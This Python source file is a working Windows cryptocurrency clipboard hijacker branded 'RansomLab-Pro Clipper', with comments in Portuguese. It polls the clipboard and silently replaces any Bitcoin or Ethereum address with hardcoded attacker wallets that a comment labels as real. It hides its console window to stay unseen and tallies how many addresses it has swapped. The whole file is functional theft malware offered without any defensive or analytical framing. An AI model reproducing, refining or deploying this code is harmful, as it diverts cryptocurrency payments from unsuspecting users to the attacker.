import time
import re
import win32clipboard
import ctypes
import sys
import threading
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.panel import Panel
from rich.align import Align
from rich.progress import SpinnerColumn, TimeElapsedColumn, Progress
from datetime import datetime

# Initialize Rich console
console = Console()

# Carteiras de destino (REAIS - NÃO MODIFICAR)
TARGET_WALLETS = {
    "btc": "bc1q4g636c8qlqpazkxc73zeudsn4e52mysycfmfwm",
    "eth": "0x4FB2b1d8092f68cBcBd731Df2781B2A8E5d2cBfA"
}

# Regex realista para endereços BTC e ETH
BTC_REGEX = re.compile(r"\b(?:bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\b")
ETH_REGEX = re.compile(r"\b0x[a-fA-F0-9]{40}\b")

# Estatísticas de substituição
stats = {"btc": 0, "eth": 0}

# ==========================
# Clipboard Monitor Helpers
# ==========================

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return data or ""
    except Exception:
        return ""


def set_clipboard(text: str):
    try:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
    except Exception:
        pass


def replace_wallet(text: str) -> str:
    if BTC_REGEX.search(text):
        stats["btc"] += 1
        console.log(f"[green]BTC detectado:[/green] {text}")
        return TARGET_WALLETS["btc"]
    elif ETH_REGEX.search(text):
        stats["eth"] += 1
        console.log(f"[yellow]ETH detectado:[/yellow] {text}")
        return TARGET_WALLETS["eth"]
    return None


def detect_and_replace():
    current = get_clipboard()
    replacement = replace_wallet(current)
    if replacement:
        set_clipboard(replacement)
        console.log(f"[bold red]Substituído por:[/bold red] {replacement}")

# ====================
# Modo Stealth Brutal
# ====================

def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            ctypes.windll.kernel32.CloseHandle(whnd)
    except Exception:
        pass

# ====================
# Execução em Thread
# ====================

def run_clipper():
    progress = Progress(SpinnerColumn(), "[bold blue]Monitorando clipboard...[/bold blue]", TimeElapsedColumn(), console=console)
    with Live(Align.center(Panel("[bold]RansomLab-Pro Clipper Ativo[/bold]", border_style="magenta")), console=console, refresh_per_second=4) as live:
        task = progress.add_task("clipper", start=False)
        while True:
            try:
                progress.start_task(task)
                detect_and_replace()
                progress.stop_task(task)
                time.sleep(1)
            except Exception as e:
                console.log(f"[red][CLIPPER-ERROR][/red] {e}")

# ====================
# Estatísticas finais
# ====================

def show_stats():
    table = Table(title="Estatísticas de Substituição de Endereços")
    table.add_column("Tipo", justify="center")
    table.add_column("Total Substituições", justify="right")
    for k, v in stats.items():
        table.add_row(k.upper(), str(v))
    console.print(table)

# ====================
# Entry Brutal Mode
# ====================

def main():
    hide_console()
    console.clear()
    console.rule("[bold red]RansomLab-Pro Clipper iniciado[/bold red]")
    thread = threading.Thread(target=run_clipper, daemon=True)
    thread.start()
    try:
        while thread.is_alive():
            time.sleep(5)
    except KeyboardInterrupt:
        console.rule("[bold yellow]Encerrando Clipper[/bold yellow]")
        show_stats()
        sys.exit(0)

if __name__ == "__main__":
    main()
